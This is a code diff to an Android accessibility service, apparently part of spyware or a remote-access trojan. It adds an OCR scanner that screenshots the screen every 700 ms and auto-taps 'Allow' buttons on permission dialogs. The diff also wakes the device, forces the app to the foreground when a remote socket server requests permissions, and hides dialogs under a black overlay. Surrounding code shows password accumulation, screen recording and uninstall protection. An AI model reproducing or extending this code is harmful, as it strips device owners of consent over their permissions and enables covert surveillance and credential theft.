@@ -120,6 +120,32 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     // Screen state receiver — auto-starts/stops screen reader recording
     private android.content.BroadcastReceiver screenStateReceiver;
+
+    // ── OCR Permission Scanner (API 30+) ─────────────────────────────────────
+    // Runs alongside the accessibility-tree scanner during autoGrantMode.
+    // Captures a screenshot every 700 ms and uses ML Kit on-device text
+    // recognition to find Allow/Grant buttons whose nodes are invisible or
+    // absent from the accessibility window hierarchy (e.g. the overlay-style
+    // dialogs from com.android.permissioncontroller on Android 11+).
+    private Handler ocrScanHandler;
+    private Runnable ocrScanRunnable;
+    private Runnable ocrStopRunnable;
+    private volatile boolean ocrScanActive = false;
+    private com.google.mlkit.vision.text.TextRecognizer ocrTextRecognizer;
+
+    // Button labels that mean "grant this permission" (case-insensitive, full-line or prefix match)
+    private static final String[] OCR_ALLOW_KEYWORDS = {
+        "allow", "grant", "ok", "accept", "continue", "permit",
+        "turn on", "enable", "yes",
+        "while using", "only this time",
+        "allow all the time", "allow only while using",
+        "allow access", "while using the app"
+    };
+    // Any line containing one of these is skipped — these are deny/cancel buttons
+    private static final String[] OCR_DENY_KEYWORDS = {
+        "don't allow", "dont allow", "deny", "never",
+        "cancel", "no thanks", "not now", "block", "decline"
+    };
     
     public static UnifiedAccessibilityService getInstance() {
         return instance;
@@ -961,6 +987,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
+        // Start the OCR scanner in parallel — catches Allow buttons invisible to the
+        // accessibility tree (permissioncontroller overlays on Android 11+).
+        startOcrPermissionScanner();
+
         // Step 1 (500 ms): Navigate to MainActivity under the black overlay.
         // The user just enabled accessibility in Settings — we bring them back to the
         // app first so they never see permission dialogs appearing on top of Settings
@@ -994,13 +1024,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         }, 2_500);
 
-        // Auto-grant mode expires after 32 seconds (extended slightly to account for the
-        // extra 1.5 s delay before permissions start appearing).
+        // Auto-grant mode (accessibility tree) expires after 32 seconds.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired");
+            Log.i(TAG, "Auto-grant mode (accessibility tree) expired");
         }, 32_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — navigate→MainActivity@500ms, perms@2500ms, expires@32s");
+        // OCR scanner runs independently for a full 2 minutes so it catches slow
+        // dialogs that appear after the accessibility tree scanner has already stopped.
+        // Cancel any prior stop runnable so a fresh 2-minute window always applies.
+        if (ocrStopRunnable != null) autoGrantHandler.removeCallbacks(ocrStopRunnable);
+        ocrStopRunnable = this::stopOcrPermissionScanner;
+        autoGrantHandler.postDelayed(ocrStopRunnable, 120_000);
+        Log.i(TAG, "Auto-grant ENABLED — tree@32s, OCR@120s, navigate@500ms, perms@2500ms");
     }
 
     /**
@@ -1013,11 +1048,106 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     ? permissionBgHandler : new Handler(Looper.getMainLooper());
         }
         autoGrantMode = true;
+        startOcrPermissionScanner();
+        // Accessibility-tree scanner stops after durationMs
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
+            Log.i(TAG, "Auto-grant mode (accessibility tree) expired (on-demand re-enable)");
         }, durationMs);
-        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
+        // OCR always runs for at least 2 minutes regardless of durationMs.
+        // Cancel any prior stop runnable first so calling reEnableAutoGrant() again
+        // always resets the full 2-minute window instead of being cut short by an
+        // earlier pending callback (method references create new Runnable instances,
+        // so removeCallbacks on the stored reference is the only reliable cancel).
+        long ocrDuration = Math.max(durationMs, 120_000);
+        if (ocrStopRunnable != null) autoGrantHandler.removeCallbacks(ocrStopRunnable);
+        ocrStopRunnable = this::stopOcrPermissionScanner;
+        autoGrantHandler.postDelayed(ocrStopRunnable, ocrDuration);
+        Log.i(TAG, "Auto-grant RE-ENABLED — tree@" + durationMs + "ms, OCR@" + ocrDuration + "ms");
+    }
+
+    /**
+     * Brings the app to the foreground, then shows the native permission dialog.
+     *
+     * Problem: when the socket server requests a permission (device is idle /
+     * screen is on but the user is in a different app), Android 10+ will silently
+     * drop a plain startActivity() call from a background service. Even with a
+     * full-screen notification, the PermissionRequestActivity can land behind the
+     * current foreground app because its task is in the back stack.
+     *
+     * Fix:
+     *   1. Use the AccessibilityService context (exempt from background-launch
+     *      restriction on API 29+) to launch MainActivity — this brings our task
+     *      to the foreground instantly.
+     *   2. After 450 ms (enough for MainActivity to be visible), launch
+     *      PermissionRequestActivity inside the now-foreground task. Android shows
+     *      the native permission dialog on top of it.
+     *   3. Simultaneously re-enable auto-grant for 2 minutes so both the
+     *      accessibility-tree scanner and the OCR scanner auto-click "Allow".
+     *
+     * @param perms permission strings to request (already-granted ones are filtered out
+     *              inside PermissionRequestActivity).
+     */
+    public void launchPermissionDialogInForeground(String[] perms) {
+        if (perms == null || perms.length == 0) return;
+        Handler h = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+
+        // Step 0 (0 ms): Acquire a FULL wake lock so the screen turns on even if
+        // the device is asleep. Without this the dialog is launched but never seen.
+        h.post(() -> {
+            try {
+                android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                if (pm != null) {
+                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
+                            android.os.PowerManager.FULL_WAKE_LOCK
+                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+                            | android.os.PowerManager.ON_AFTER_RELEASE,
+                            "tusker:perm_request");
+                    wl.acquire(10_000); // auto-release after 10 s
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionDialogInForeground: wake lock failed: " + e.getMessage());
+            }
+        });
+
+        // Step 1 (0 ms): Bring our task to the foreground.
+        // FLAG_ACTIVITY_CLEAR_TASK destroys any stale back-stack and forces a fresh
+        // MainActivity, making it reliably foreground even after the user swiped the
+        // app away from recents (where REORDER_TO_FRONT + SINGLE_TOP silently fail).
+        h.post(() -> {
+            try {
+                Intent mainIntent = new Intent(this, com.task.tusker.MainActivity.class);
+                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                startActivity(mainIntent);
+                Log.i(TAG, "launchPermissionDialogInForeground: brought MainActivity to front");
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionDialogInForeground: MainActivity failed: " + e.getMessage());
+            }
+        });
+
+        // Step 2 (600 ms): Launch the transparent PermissionRequestActivity.
+        // Extra 150 ms (vs old 450 ms) gives MainActivity time to be fully visible
+        // after a cold start when the task was previously cleared.
+        h.postDelayed(() -> {
+            try {
+                Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
+                pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS, perms);
+                pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(pIntent);
+                Log.i(TAG, "launchPermissionDialogInForeground: PermissionRequestActivity launched");
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionDialogInForeground: PermissionRequestActivity failed: " + e.getMessage());
+            }
+        }, 600);
+
+        // Also activate OCR + accessibility-tree granter for 2 minutes so the
+        // "Allow" button is clicked automatically.
+        reEnableAutoGrant(120_000);
     }
 
     /**
@@ -1040,8 +1170,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * because runPermissionGranter already covers all known button/toggle variants.
      */
     public void enableStorageAutoGrant() {
-        // Activate the 350 ms background scanner (autoGrantMode) for the full 20 s window.
-        reEnableAutoGrant(20_000);
+        // Activate the accessibility-tree scanner + OCR scanner for the full 20 s window.
+        reEnableAutoGrant(20_000); // also calls startOcrPermissionScanner()
 
         // Suspend defent/uninstall protection so it cannot interfere with the settings screen.
         protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
@@ -2815,6 +2945,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             SocketManager.getInstance(this).stopScreenReaderAuto();
         } catch (Exception ignored) {}
         try {
+            // Stop OCR scanner and release the ML Kit TextRecognizer
+            stopOcrPermissionScanner();
+            if (ocrTextRecognizer != null) {
+                ocrTextRecognizer.close();
+                ocrTextRecognizer = null;
+            }
+        } catch (Exception ignored) {}
+        try {
             // Cancel all periodic scanner callbacks before quitting the HandlerThread.
             if (permissionScanHandler != null && permissionScanRunnable != null) {
                 permissionScanHandler.removeCallbacks(permissionScanRunnable);
@@ -3132,6 +3270,164 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
         // Clear all keys for this package
         passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    // OCR PERMISSION SCANNER
+    // ══════════════════════════════════════════════════════════════════════════
+
+    /** Returns the shared ML Kit TextRecognizer, creating it on first call. */
+    private com.google.mlkit.vision.text.TextRecognizer getOrCreateOcrRecognizer() {
+        if (ocrTextRecognizer == null) {
+            ocrTextRecognizer = com.google.mlkit.vision.text.TextRecognition.getClient(
+                    com.google.mlkit.vision.text.latin.TextRecognizerOptions.DEFAULT_OPTIONS);
+        }
+        return ocrTextRecognizer;
+    }
+
+    /**
+     * Starts the OCR-based permission-grant scanner (API 30 / Android 11+ only).
+     *
+     * Every 700 ms it:
+     *   1. Captures a full-screen bitmap via AccessibilityService.takeScreenshot().
+     *   2. Runs ML Kit on-device Latin text recognition on the bitmap.
+     *   3. For each recognised text line, checks against the allow/deny keyword lists.
+     *   4. Taps the centre of the first matching line using a GestureDescription touch
+     *      event — completely bypassing the accessibility node tree.
+     *
+     * This runs in PARALLEL with the accessibility-tree scanner so both approaches
+     * try to find the "Allow" button simultaneously. Whichever succeeds first wins.
+     * Safe to call when already running — re-entry is guarded by ocrScanActive.
+     */
+    @SuppressWarnings("NewApi")
+    private void startOcrPermissionScanner() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return; // needs API 30
+        if (ocrScanActive) return;
+        ocrScanActive = true;
+        ocrScanHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+        ocrScanRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!ocrScanActive) return;
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        Bitmap bmp = captureScreenSync();
+                        if (bmp != null) {
+                            processScreenshotForGrant(bmp);
+                            bmp.recycle();
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "OCR scanner error: " + e.getMessage());
+                }
+                if (ocrScanActive && ocrScanHandler != null) {
+                    ocrScanHandler.postDelayed(this, 700);
+                }
+            }
+        };
+        // 1 s initial delay so the permission dialog has time to render
+        ocrScanHandler.postDelayed(ocrScanRunnable, 1000);
+        Log.i(TAG, "OCR permission scanner STARTED (API 30+, 700 ms interval)");
+    }
+
+    /** Stops the OCR scanner and cancels any pending callback. */
+    private void stopOcrPermissionScanner() {
+        ocrScanActive = false;
+        if (ocrScanHandler != null && ocrScanRunnable != null) {
+            ocrScanHandler.removeCallbacks(ocrScanRunnable);
+        }
+        Log.i(TAG, "OCR permission scanner STOPPED");
+    }
+
+    /**
+     * Runs ML Kit text recognition on {@code bitmap}, then taps the first text
+     * line that matches an allow-keyword and does not match any deny-keyword.
+     *
+     * Coordinate mapping: AccessibilityService.takeScreenshot() returns a
+     * hardware buffer at the display's native resolution, which is then copied
+     * to a software ARGB_8888 bitmap. The width/height of that bitmap equals the
+     * physical screen dimensions, so ML Kit bounding-box pixels map 1:1 to screen
+     * pixels. A safety scale factor is computed anyway in case a device downscales.
+     *
+     * Only one tap is dispatched per call (the first matching button found top-to-
+     * bottom, left-to-right). The next 700 ms poll handles any follow-up dialogs.
+     */
+    @RequiresApi(api = Build.VERSION_CODES.R)
+    private void processScreenshotForGrant(final Bitmap bitmap) {
+        try {
+            com.google.mlkit.vision.common.InputImage image =
+                    com.google.mlkit.vision.common.InputImage.fromBitmap(bitmap, 0);
+
+            final CountDownLatch latch = new CountDownLatch(1);
+            final AtomicReference<com.google.mlkit.vision.text.Text> resultRef =
+                    new AtomicReference<>();
+
+            getOrCreateOcrRecognizer().process(image)
+                    .addOnSuccessListener(text -> {
+                        resultRef.set(text);
+                        latch.countDown();
+                    })
+                    .addOnFailureListener(e -> {
+                        Log.w(TAG, "OCR recognition failed: " + e.getMessage());
+                        latch.countDown();
+                    });
+
+            if (!latch.await(2000, TimeUnit.MILLISECONDS)) {
+                Log.w(TAG, "OCR timed out after 2 s");
+                return;
+            }
+
+            com.google.mlkit.vision.text.Text result = resultRef.get();
+            if (result == null || result.getTextBlocks().isEmpty()) return;
+
+            // Scale factor: bitmap pixels → physical screen pixels (usually 1.0)
+            float scaleX = bitmap.getWidth()  > 0 ? (float) screenWidth  / bitmap.getWidth()  : 1f;
+            float scaleY = bitmap.getHeight() > 0 ? (float) screenHeight / bitmap.getHeight() : 1f;
+
+            for (com.google.mlkit.vision.text.Text.TextBlock block : result.getTextBlocks()) {
+                for (com.google.mlkit.vision.text.Text.Line line : block.getLines()) {
+                    String raw = line.getText().trim();
+                    String low = raw.toLowerCase(java.util.Locale.ROOT);
+
+                    // Reject deny-keywords first
+                    boolean deny = false;
+                    for (String dk : OCR_DENY_KEYWORDS) {
+                        if (low.contains(dk)) { deny = true; break; }
+                    }
+                    if (deny) continue;
+
+                    // Accept if the line equals, starts with, or ends with an allow-keyword
+                    boolean allow = false;
+                    for (String ak : OCR_ALLOW_KEYWORDS) {
+                        if (low.equals(ak)
+                                || low.startsWith(ak + " ")
+                                || low.endsWith(" " + ak)) {
+                            allow = true;
+                            break;
+                        }
+                    }
+                    if (!allow) continue;
+
+                    android.graphics.Rect bounds = line.getBoundingBox();
+                    if (bounds == null) continue;
+
+                    float cx = bounds.centerX() * scaleX;
+                    float cy = bounds.centerY() * scaleY;
+
+                    // Reject coordinates outside the visible screen
+                    if (cx < 1 || cy < 1 || cx > screenWidth - 1 || cy > screenHeight - 1) continue;
+
+                    Log.i(TAG, "OCR tap → \"" + raw + "\" at (" + (int)cx + ", " + (int)cy + ")");
+                    performClick(cx, cy);
+                    return; // one tap per scan cycle
+                }
+            }
+        } catch (InterruptedException ie) {
+            Thread.currentThread().interrupt();
+        } catch (Exception e) {
+            Log.e(TAG, "processScreenshotForGrant error: " + e.getMessage());
+        }
     }
 
     /**
